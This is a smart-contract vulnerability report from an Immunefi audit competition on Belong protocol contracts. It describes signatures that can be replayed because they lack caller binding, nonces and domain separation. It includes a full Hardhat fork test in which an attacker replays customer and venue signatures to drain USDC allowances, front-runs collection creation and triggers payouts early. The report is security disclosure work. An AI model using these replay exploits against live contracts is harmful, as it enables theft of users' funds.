# 57723 sc medium signature replay front run and timing control issues

**Submitted on Oct 28th 2025 at 13:14:49 UTC by @koko7 for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57723
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/BelongCheckIn.sol>
* **Impacts:**
  * Permanent freezing of NFTs
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Permanent freezing of funds
  * Block stuffing

## Description

## Brief/Intro

Multiple Belong protocol entry points accept platform‑signed payloads that are not bound to the caller, have no nonces/deadlines, and omit contract domain separation. As a result, valid signatures can be replayed by any address: customers can be repeatedly charged (Critical), venues can be forced to deposit repeatedly (High), AccessToken creation can be front‑run to squat collection names (High), and promoter payouts can be executed earlier than intended by anyone (Medium). In production, this leads to unauthorized spend, branding DoS, and operational griefing.

## Vulnerability Details

* Critical — payToVenue replay (USDC path)
  * Signatures validated here exclude `msg.sender`, have no nonce/deadline, and omit `verifyingContract`:

    ```solidity
    // contracts/v2/utils/SignatureVerifier.sol
    function checkCustomerInfo(address signer, CustomerInfo calldata customerInfo, VenueRules memory rules)
        external
        view
    {
        // ... rule checks ...
        require(
            signer.isValidSignatureNow(
                keccak256(
                    abi.encodePacked(
                        customerInfo.paymentInUSDC,
                        customerInfo.visitBountyAmount,
                        customerInfo.spendBountyPercentage,
                        customerInfo.customer,
                        customerInfo.venueToPayFor,
                        customerInfo.promoter,
                        customerInfo.amount,
                        block.chainid
                    )
                ),
                customerInfo.signature
            ),
            InvalidSignature()
        );
    }
    ```

    Then funds are pulled from the customer each time the signed payload is replayed:

    ```solidity
    // contracts/v2/platform/BelongCheckIn.sol
    if (customerInfo.paymentInUSDC) {
        _storage.paymentsInfo.usdc
            .safeTransferFrom(customerInfo.customer, customerInfo.venueToPayFor, customerInfo.amount);
    }
    ```
* High — venueDeposit replayable forced spend
  * Venue signatures lack caller binding, nonce/deadline, and domain separation:

    ```solidity
    // contracts/v2/utils/SignatureVerifier.sol
    function checkVenueInfo(address signer, VenueInfo calldata venueInfo) external view {
        require(
            signer.isValidSignatureNow(
                keccak256(abi.encodePacked(venueInfo.venue, venueInfo.referralCode, venueInfo.uri, block.chainid)),
                venueInfo.signature
            ),
            InvalidSignature()
        );
    }
    ```

    On success, `venueDeposit` pulls USDC from the venue, applies fees, and mints credits; replaying the same signature re‑executes the spend as long as allowance remains.
* High — Factory produce front‑run (name+symbol)
  * AccessToken creation signatures cover only `(name, symbol, contractURI, feeNumerator, chainid)` and are not bound to the intended creator:

    ```solidity
    // contracts/v2/utils/SignatureVerifier.sol
    function checkAccessTokenInfo(address signer, AccessTokenInfo memory accessTokenInfo) external view {
        require(
            signer.isValidSignatureNow(
                keccak256(abi.encodePacked(
                    accessTokenInfo.metadata.name,
                    accessTokenInfo.metadata.symbol,
                    accessTokenInfo.contractURI,
                    accessTokenInfo.feeNumerator,
                    block.chainid
                )),
                accessTokenInfo.signature
            ),
            InvalidSignature()
        );
    }
    ```

    Factory uses `(name, symbol)` salt and `msg.sender` as creator. The first submitter with a valid signature wins; others hit `TokenAlreadyExists()`:

    ```solidity
    // contracts/v2/platform/Factory.sol
    require(getNftInstanceInfo[hashedSalt].nftAddress == address(0), TokenAlreadyExists());
    // ...
    AccessToken(nftAddress).initialize({ /* creator: msg.sender, ... */ });
    ```
* Medium — promoter payouts timing control
  * Payout signatures are caller‑agnostic, lack nonce/deadline, and omit domain separation:

    ```solidity
    // contracts/v2/utils/SignatureVerifier.sol
    function checkPromoterPaymentDistribution(address signer, PromoterInfo memory promoterInfo) external view {
        require(
            signer.isValidSignatureNow(
                keccak256(abi.encodePacked(promoterInfo.promoter, promoterInfo.venue, promoterInfo.amountInUSD, block.chainid)),
                promoterInfo.signature
            ),
            InvalidSignature()
        );
    }
    ```

    Anyone can execute payouts early; credits are burned to prevent double‑spend, but timing is attacker‑controlled.
* Informational (shared concerns)
  * `abi.encodePacked` with multiple strings → ambiguity risk; use EIP‑712 typed data.
  * No nonces/deadlines across signed flows → replayable.
  * No contract address in domain → potential cross‑app replay if the same signer key is reused.

## Impact Details

* Critical (payToVenue)
  * Unauthorized, repeated USDC transfers from customer to venue up to allowance/balance; likely large impact due to common infinite allowances.
* High (venueDeposit)
  * Forced repeated deposits from venue to escrow; fees/credits re‑applied; spend controlled by attacker while allowance exists.
  * Branding/availability DoS: attacker squats collection (name, symbol); legitimate deployer is blocked by `TokenAlreadyExists()`.
* Medium (promoter payouts)
  * Payout timing controlled by anyone; automation can be griefed; operational/financial mismatches may occur (though double‑spend is prevented by credit burn).

## References

* Signature checks: `contracts/v2/utils/SignatureVerifier.sol` — `checkCustomerInfo`, `checkVenueInfo`, `checkAccessTokenInfo`, `checkPromoterPaymentDistribution`
* Execution sites: `contracts/v2/platform/BelongCheckIn.sol` — `payToVenue`, `venueDeposit`, `distributePromoterPayments`
* Factory creation: `contracts/v2/platform/Factory.sol` — `produce`
* Reproducer tests: `test/v2/security/signature-replay.test.ts`

## Proof of Concept

* create a test file: `test/v2/security/signature-replay.test.ts`
* Run command (uses mainnet fork and dummy env vars for config):

```bash
LEDGER_ADDRESS=0x0000000000000000000000000000000000000001 \
PK=0x1000000000000000000000000000000000000000000000000000000000000001 \
npx hardhat test test/v2/security/signature-replay.test.ts
```

* Sample logs from a passing run:

```
[setup] venueDeposit done; escrow.usdcDeposits = 100000000
[payToVenue] customer USDC delta = 10000000
[payToVenue] venue USDC delta = 10000000
[venueDeposit] venue USDC delta (forced) = 32000000
[factory] Front-run successful: token exists; subsequent create reverts TokenAlreadyExists
[promoter] USDC received (attacker-triggered) = 1800000
```

Provided below is the full reproducer test used in the report (unchanged). It demonstrates replay of customer signatures, replayable venue deposits, factory front-running, and promoter payout timing control.

```ts
import { ethers } from 'hardhat';
import { BigNumber } from 'ethers';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import EthCrypto from 'eth-crypto';
import { expect } from 'chai';

import {
  AccessToken,
  CreditToken,
  Escrow,
  Factory,
  Helper,
  MockTransferValidatorV2,
  RoyaltiesReceiverV2,
  SignatureVerifier,
  Staking,
  BelongCheckIn,
  VestingWalletExtended,
} from '../../../typechain-types';

import {
  deployAccessTokenImplementation,
  deployCreditTokenImplementation,
  deployFactory,
  deployRoyaltiesReceiverV2Implementation,
  deployStaking,
  deployBelongCheckIn,
  deployEscrow,
  deployVestingWalletImplementation,
} from '../../../helpers/deployFixtures';

import { deployHelper, deploySignatureVerifier } from '../../../helpers/deployLibraries';
import { deployMockTransferValidatorV2 } from '../../../helpers/deployMockFixtures';
import { getSignerFromAddress, getToken, startSimulateMainnet, stopSimulate } from '../../../helpers/fork';
import { U, u } from '../../../helpers/math';
import {
  CustomerInfoStruct,
  PromoterInfoStruct,
  VenueInfoStruct,
  VenueRulesStruct,
} from '../../../typechain-types/contracts/v2/platform/BelongCheckIn';

// Security regression tests focused on signature replay / missing domain separation
// Uses mainnet fork for realistic token flows and Uniswap interactions where needed.

describe('Security: Signature replay and domain separation', () => {
  const chainId = 31337;

  // Mainnet addresses
  const WETH_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
  const USDC_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
  const ENA_ADDRESS = '0x57e114B691Db790C35207b2e685D4A43181e6061'; // used instead of LONG

  const USDC_WHALE_ADDRESS = '0x8EB8a3b98659Cce290402893d0123abb75E3ab28';
  const WETH_WHALE_ADDRESS = '0x57757E3D981446D585Af0D9Ae4d7DF6D64647806';
  const ENA_WHALE_ADDRESS = '0xF977814e90dA44bFA03b6295A0616a897441aceC';

  const UNISWAP_FACTORY_ADDRESS = '0x1F98431c8aD98523631AE4a59f267346ea31F984';
  const UNISWAP_ROUTER_ADDRESS = '0xE592427A0AEce92De3Edee1F18E0157C05861564';
  const UNISWAP_QUOTER_ADDRESS = '0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6';
  const POOL_FEE = 3000;
  const MAX_PRICEFEED_DELAY = 3600;

  const usdcPercentage = 1000; // 10%
  const convenienceFeeAmount = U(5, 6); // $5

  const paymentsInfo: BelongCheckIn.PaymentsInfoStruct = {
    swapPoolFees: POOL_FEE,
    slippageBps: BigNumber.from(10).pow(27).sub(1),
    swapV3Factory: UNISWAP_FACTORY_ADDRESS,
    swapV3Router: UNISWAP_ROUTER_ADDRESS,
    swapV3Quoter: UNISWAP_QUOTER_ADDRESS,
    wNativeCurrency: WETH_ADDRESS,
    usdc: USDC_ADDRESS,
    long: ENA_ADDRESS,
    maxPriceFeedDelay: MAX_PRICEFEED_DELAY,
  };

  const stakingRewards: [
    BelongCheckIn.RewardsInfoStruct,
    BelongCheckIn.RewardsInfoStruct,
    BelongCheckIn.RewardsInfoStruct,
    BelongCheckIn.RewardsInfoStruct,
    BelongCheckIn.RewardsInfoStruct,
  ] = [
    {
      venueStakingInfo: { depositFeePercentage: 1000, convenienceFeeAmount } as BelongCheckIn.VenueStakingRewardInfoStruct,
      promoterStakingInfo: { usdcPercentage, longPercentage: 800 } as BelongCheckIn.PromoterStakingRewardInfoStruct,
    } as BelongCheckIn.RewardsInfoStruct,
    {
      venueStakingInfo: { depositFeePercentage: 900, convenienceFeeAmount } as BelongCheckIn.VenueStakingRewardInfoStruct,
      promoterStakingInfo: { usdcPercentage, longPercentage: 700 } as BelongCheckIn.PromoterStakingRewardInfoStruct,
    } as BelongCheckIn.RewardsInfoStruct,
    {
      venueStakingInfo: { depositFeePercentage: 800, convenienceFeeAmount } as BelongCheckIn.VenueStakingRewardInfoStruct,
      promoterStakingInfo: { usdcPercentage, longPercentage: 600 } as BelongCheckIn.PromoterStakingRewardInfoStruct,
    } as BelongCheckIn.RewardsInfoStruct,
    {
      venueStakingInfo: { depositFeePercentage: 700, convenienceFeeAmount } as BelongCheckIn.VenueStakingRewardInfoStruct,
      promoterStakingInfo: { usdcPercentage, longPercentage: 500 } as BelongCheckIn.PromoterStakingRewardInfoStruct,
    } as BelongCheckIn.RewardsInfoStruct,
    {
      venueStakingInfo: { depositFeePercentage: 500, convenienceFeeAmount } as BelongCheckIn.VenueStakingRewardInfoStruct,
      promoterStakingInfo: { usdcPercentage, longPercentage: 400 } as BelongCheckIn.PromoterStakingRewardInfoStruct,
    } as BelongCheckIn.RewardsInfoStruct,
  ];

  const fees: BelongCheckIn.FeesStruct = {
    referralCreditsAmount: 3,
    affiliatePercentage: 1000,
    longCustomerDiscountPercentage: 300,
    platformSubsidyPercentage: 300,
    processingFeePercentage: 250,
    buybackBurnPercentage: 5000,
  };

  let implementations: Factory.ImplementationsStruct, contracts: BelongCheckIn.ContractsStruct;

  before(startSimulateMainnet);
  after(stopSimulate);

  async function fixture() {
    const [admin, treasury, attacker, , , , referral] = await ethers.getSigners();
    const signer = EthCrypto.createIdentity();

    const WETH_whale = await getSignerFromAddress(WETH_WHALE_ADDRESS);
    const USDC_whale = await getSignerFromAddress(USDC_WHALE_ADDRESS);
    const ENA_whale = await getSignerFromAddress(ENA_WHALE_ADDRESS);
    const WETH = await getToken(WETH_ADDRESS);
    const USDC = await getToken(USDC_ADDRESS);
    const ENA = await getToken(ENA_ADDRESS);

    const signatureVerifier: SignatureVerifier = await deploySignatureVerifier();
    const validator: MockTransferValidatorV2 = await deployMockTransferValidatorV2();
    const accessTokenImplementation: AccessToken = await deployAccessTokenImplementation(signatureVerifier.address);
    const royaltiesReceiverV2Implementation: RoyaltiesReceiverV2 = await deployRoyaltiesReceiverV2Implementation();
    const creditTokenImplementation: CreditToken = await deployCreditTokenImplementation();
    const vestingWallet: VestingWalletExtended = await deployVestingWalletImplementation();

    implementations = {
      accessToken: accessTokenImplementation.address,
      creditToken: creditTokenImplementation.address,
      royaltiesReceiver: royaltiesReceiverV2Implementation.address,
      vestingWallet: vestingWallet.address,
    };

    const factory: Factory = await deployFactory(
      treasury.address,
      signer.address,
      signatureVerifier.address,
      validator.address,
      implementations,
    );

    const helper: Helper = await deployHelper();
    const staking: Staking = await deployStaking(admin.address, treasury.address, ENA_ADDRESS);

    const referralCode = EthCrypto.hash.keccak256([
      { type: 'address', value: referral.address },
      { type: 'address', value: factory.address },
      { type: 'uint256', value: chainId },
    ]);
    await factory.connect(referral).createReferralCode();

    const belongCheckIn: BelongCheckIn = await deployBelongCheckIn(
      signatureVerifier.address,
      helper.address,
      admin.address,
      paymentsInfo,
    );

    const escrow: Escrow = await deployEscrow(belongCheckIn.address);

    const { venueToken, promoterToken } = await (async () => {
      const res = await (await import('../../../helpers/deployFixtures')).deployCreditTokens(
        true,
        false,
        factory.address,
        signer.privateKey,
        admin,
        admin.address,
        belongCheckIn.address,
        belongCheckIn.address,
      );
      return res;
    })();

    contracts = {
      factory: factory.address,
      escrow: escrow.address,
      staking: staking.address,
      venueToken: venueToken.address,
      promoterToken: promoterToken.address,
      longPF: ENA_ADDRESS, // not used in USDC-path tests
    };

    await belongCheckIn.setContracts(contracts);

    return {
      signatureVerifier,
      helper,
      factory,
      staking,
      venueToken,
      promoterToken,
      belongCheckIn,
      escrow,
      admin,
      treasury,
      attacker,
      referral,
      signer,
      referralCode,
      WETH,
      USDC,
      ENA,
      WETH_whale,
      USDC_whale,
      ENA_whale,
    };
  }

  describe('Critical: payToVenue replay (USDC path)', () => {
    it('anyone can replay a valid customer payload and repeatedly pull USDC from customer allowance', async () => {
      const {
        belongCheckIn,
        helper,
        signer,
        referral,
        referralCode,
        USDC,
        ENA,
        USDC_whale,
        WETH_whale: customer,
        attacker,
        escrow,
      } = await loadFixture(fixture);

      // 1) Venue sets rules via a signed deposit (so payToVenue has non-None rules)
      const uri = 'venue:rules';
      const venue = USDC_whale.address;
      const venueAmount = await u(100, USDC);
      const venueMsg = ethers.utils.solidityKeccak256(
        ['address', 'bytes32', 'string', 'uint256'],
        [venue, referralCode, uri, chainId],
      );
      const venueSig = EthCrypto.sign(signer.privateKey, venueMsg);
      const venueInfo: VenueInfoStruct = {
        rules: { paymentType: 3, bountyType: 3, longPaymentType: 0 } as VenueRulesStruct,
        venue,
        amount: venueAmount,
        referralCode,
        uri,
        signature: venueSig,
      };

      const affiliateFee = await helper.calculateRate(1000, venueAmount);
      const willBeTaken = affiliateFee.add(convenienceFeeAmount.add(venueAmount));
      await USDC.connect(USDC_whale).approve(belongCheckIn.address, willBeTaken);

      await belongCheckIn.connect(USDC_whale).venueDeposit(venueInfo);
      const escrowBefore = await escrow.venueDeposits(venue);
      console.log('[setup] venueDeposit done; escrow.usdcDeposits =', escrowBefore.usdcDeposits.toString());

      // 2) Prepare a valid CustomerInfo signed by platform signer (USDC path)
      const customerAmount = await u(5, USDC);
      await USDC.connect(USDC_whale).transfer(customer.address, customerAmount.mul(3));
      await USDC.connect(customer).approve(belongCheckIn.address, customerAmount.mul(3));

      const customerMsg = ethers.utils.solidityKeccak256(
        ['bool', 'uint128', 'uint24', 'address', 'address', 'address', 'uint256', 'uint256'],
        [true, await u(1, USDC), 1000, customer.address, venue, referral.address, customerAmount, chainId],
      );
      const customerSig = EthCrypto.sign(signer.privateKey, customerMsg);

      const customerInfo: CustomerInfoStruct = {
        paymentInUSDC: true,
        visitBountyAmount: await u(1, USDC),
        spendBountyPercentage: 1000,
        customer: customer.address,
        venueToPayFor: venue,
        promoter: referral.address,
        amount: customerAmount,
        signature: customerSig,
      };

      const balCustomerBefore = await USDC.balanceOf(customer.address);
      const balVenueBefore = await USDC.balanceOf(venue);

      // 3) Attacker replays the same signed payload twice
      await belongCheckIn.connect(attacker).payToVenue(customerInfo);
      await belongCheckIn.connect(attacker).payToVenue(customerInfo);

      const balCustomerAfter = await USDC.balanceOf(customer.address);
      const balVenueAfter = await USDC.balanceOf(venue);

      console.log('[payToVenue] customer USDC delta =', balCustomerBefore.sub(balCustomerAfter).toString());
      console.log('[payToVenue] venue USDC delta =', balVenueAfter.sub(balVenueBefore).toString());

      expect(balCustomerBefore.sub(balCustomerAfter)).to.eq(customerAmount.mul(2));
      expect(balVenueAfter.sub(balVenueBefore)).to.eq(customerAmount.mul(2));
    });
  });

  describe('High: venueDeposit replayable forced spend if allowance left', () => {
    it('anyone can reuse a valid venueDeposit signature to pull USDC again from venue allowance', async () => {
      const { belongCheckIn, helper, signer, referral, referralCode, USDC, USDC_whale, attacker, escrow } =
        await loadFixture(fixture);

      const uri = 'venue:uri:replay';
      const venue = USDC_whale.address;
      const amount = await u(10, USDC);
      const msg = ethers.utils.solidityKeccak256(
        ['address', 'bytes32', 'string', 'uint256'],
        [venue, referralCode, uri, chainId],
      );
      const sig = EthCrypto.sign(signer.privateKey, msg);

      const venueInfo: VenueInfoStruct = {
        rules: { paymentType: 3, bountyType: 3, longPaymentType: 0 } as VenueRulesStruct,
        venue,
        amount,
        referralCode,
        uri,
        signature: sig,
      };

      // Approve a large allowance
      await USDC.connect(USDC_whale).approve(belongCheckIn.address, amount.mul(100));

      const balBefore = await USDC.balanceOf(venue);
      await belongCheckIn.connect(attacker).venueDeposit(venueInfo); // first forced spend
      await belongCheckIn.connect(attacker).venueDeposit(venueInfo); // replay
      const balAfter = await USDC.balanceOf(venue);

      console.log('[venueDeposit] venue USDC delta (forced) =', balBefore.sub(balAfter).toString());
      expect(balBefore).to.be.gt(balAfter);
    });
  });

  describe('High: Factory produce front-run (name+symbol) without creator binding', () => {
    it('attacker can use a valid signature to become creator; later calls revert TokenAlreadyExists', async () => {
      const { factory, signatureVerifier, attacker } = await loadFixture(fixture);

      const meta = { name: 'BrandX', symbol: 'BRX' };
      const accessTokenInfo = {
        metadata: meta,
        contractURI: 'contractURI/BrandX',
        paymentToken: ethers.constants.AddressZero,
        mintPrice: 0,
        whitelistMintPrice: 0,
        transferable: true,
        maxTotalSupply: 10,
        feeNumerator: 600,
        collectionExpire: 86400,
        signature: '0x',
      } as any;

      // Build platform signature (covers only name, symbol, contractURI, feeNumerator, chainId)
      const msg = EthCrypto.hash.keccak256([
        { type: 'string', value: meta.name },
        { type: 'string', value: meta.symbol },
        { type: 'string', value: accessTokenInfo.contractURI },
        { type: 'uint96', value: 600 },
        { type: 'uint256', value: chainId },
      ]);
      const signer = EthCrypto.createIdentity();
      // Reconfigure factory signer to this local signer for isolation
      // Note: This reduces coupling; the point is that the signature is not bound to msg.sender
      await factory.setFactoryParameters(
        {
          transferValidator: (await factory.nftFactoryParameters()).transferValidator,
          platformAddress: (await factory.nftFactoryParameters()).platformAddress,
          signerAddress: signer.address,
          platformCommission: (await factory.nftFactoryParameters()).platformCommission,
          defaultPaymentCurrency: (await factory.nftFactoryParameters()).defaultPaymentCurrency,
          maxArraySize: (await factory.nftFactoryParameters()).maxArraySize,
        },
        await factory.royaltiesParameters(),
        await factory.implementations(),
        [0, 5000, 3000, 1500, 500],
      );
      accessTokenInfo.signature = EthCrypto.sign(signer.privateKey, msg);

      // Front-run by attacker: becomes creator
      await expect(factory.connect(attacker).produce(accessTokenInfo, ethers.constants.HashZero)).to.emit(
        factory,
        'AccessTokenCreated',
      );

      // Legitimate creator (different address) attempting the same payload gets DoS'ed
      const [, creator] = await ethers.getSigners();
      await expect(factory.connect(creator).produce(accessTokenInfo, ethers.constants.HashZero)).to.be.revertedWithCustomError(
        factory,
        'TokenAlreadyExists',
      );
      console.log('[factory] Front-run successful: token exists; subsequent create reverts TokenAlreadyExists');
    });
  });

  describe('Medium: promoter payouts timing controlled by anyone with signature', () => {
    it('attacker can execute a valid payout signature before promoter, directing funds to promoter early', async () => {
      const {
        belongCheckIn,
        helper,
        signer,
        referral,
        referralCode,
        USDC,
        ENA,
        USDC_whale,
        attacker,
        escrow,
      } = await loadFixture(fixture);

      // Setup venue and deposit first to have credits and escrow funds
      const uri = 'promoter:test';
      const venue = USDC_whale.address;
      const venueAmount = await u(100, USDC);
      const venueMsg = ethers.utils.solidityKeccak256(
        ['address', 'bytes32', 'string', 'uint256'],
        [venue, referralCode, uri, chainId],
      );
      const venueSig = EthCrypto.sign(signer.privateKey, venueMsg);
      const venueInfo: VenueInfoStruct = {
        rules: { paymentType: 3, bountyType: 3, longPaymentType: 0 } as VenueRulesStruct,
        venue,
        amount: venueAmount,
        referralCode,
        uri,
        signature: venueSig,
      };
      const affiliateFee = await helper.calculateRate(1000, venueAmount);
      await USDC.connect(USDC_whale).approve(
        belongCheckIn.address,
        affiliateFee.add(convenienceFeeAmount.add(venueAmount)),
      );
      await belongCheckIn.connect(USDC_whale).venueDeposit(venueInfo);

      // Mint promoter credits via a customer USDC payment
      const customer = referral; // reuse referral as a simple EOA customer with enough USDC after transfer
      const customerAmount = await u(10, USDC);
      await USDC.connect(USDC_whale).transfer(customer.address, customerAmount);
      await USDC.connect(customer).approve(belongCheckIn.address, customerAmount);
      const customerMsg = ethers.utils.solidityKeccak256(
        ['bool', 'uint128', 'uint24', 'address', 'address', 'address', 'uint256', 'uint256'],
        [true, await u(1, USDC), 1000, customer.address, venue, referral.address, customerAmount, chainId],
      );
      const customerSig = EthCrypto.sign(signer.privateKey, customerMsg);
      const customerInfo: CustomerInfoStruct = {
        paymentInUSDC: true,
        visitBountyAmount: await u(1, USDC),
        spendBountyPercentage: 1000,
        customer: customer.address,
        venueToPayFor: venue,
        promoter: referral.address,
        amount: customerAmount,
        signature: customerSig,
      };
      await belongCheckIn.connect(customer).payToVenue(customerInfo);

      // Prepare promoter payout signature (USDC path)
      const amountInUSD = await u(2, USDC); // settle a portion
      const pmsg = ethers.utils.solidityKeccak256(
        ['address', 'address', 'uint256', 'uint256'],
        [referral.address, venue, amountInUSD, chainId],
      );
      const psig = EthCrypto.sign(signer.privateKey, pmsg);
      const promoterInfo: PromoterInfoStruct = {
        paymentInUSDC: true,
        promoter: referral.address,
        venue,
        amountInUSD,
        signature: psig,
      };

      const balPromoterBefore = await USDC.balanceOf(referral.address);
      await belongCheckIn.connect(attacker).distributePromoterPayments(promoterInfo);
      const balPromoterAfter = await USDC.balanceOf(referral.address);

      console.log('[promoter] USDC received (attacker-triggered) =', balPromoterAfter.sub(balPromoterBefore).toString());
      expect(balPromoterAfter).to.be.gt(balPromoterBefore);
    });
  });
});
```
